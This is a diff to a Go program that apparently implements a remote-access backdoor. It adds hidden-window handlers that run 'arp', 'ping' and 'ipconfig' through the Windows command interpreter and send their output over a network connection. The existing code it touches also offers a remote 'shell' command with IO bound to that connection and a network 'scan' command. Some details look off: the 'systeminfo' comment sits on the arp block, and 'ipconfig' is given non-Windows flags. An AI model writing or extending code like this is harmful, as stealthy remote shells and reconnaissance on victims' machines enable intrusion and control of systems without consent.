@@ -75,6 +75,40 @@ func main(){
 			err = cmdInstance.Run()
 		}
 
+		// Simple systeminfo call. Output redirect to conn stream
+		if firstCmd == "arp" {
+			cmdInstance := exec.Command(cmdPath, "/q", "/c", "arp", "-n")
+
+			// Set-up o streams to conn. Set option to hide windows when calling system command
+			cmdInstance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			cmdInstance.Stdout = conn
+			cmdInstance.Stderr = conn
+
+			err = cmdInstance.Run()
+		}
+
+		if firstCmd == "ping" {
+			cmdInstance := exec.Command(cmdPath, "/q", "/c", "ping", splitedCmd[1])
+
+			// Set-up o streams to conn. Set option to hide windows when calling system command
+			cmdInstance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			cmdInstance.Stdout = conn
+			cmdInstance.Stderr = conn
+
+			err = cmdInstance.Run()
+		}
+
+		if firstCmd == "ipconfig" {
+			cmdInstance := exec.Command(cmdPath, "/q", "/c", "ipconfig", "-a", "-n")
+
+			// Set-up o streams to conn. Set option to hide windows when calling system command
+			cmdInstance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			cmdInstance.Stdout = conn
+			cmdInstance.Stderr = conn
+
+			err = cmdInstance.Run()
+		}
+
 		// Call system shell. IO redirect to conn steams
 		if firstCmd == "shell" {
 			cmdInstance := exec.Command(cmdPath)
@@ -105,6 +139,7 @@ func main(){
 			fmt.Fprintln(conn, logRsl)
 		}
 
+		// Launch goScan with the net.Conn stream binded.
 		if firstCmd == "scan"{
 			goScan.Scan(conn,splitedCmd[1],"tcp")
 		}
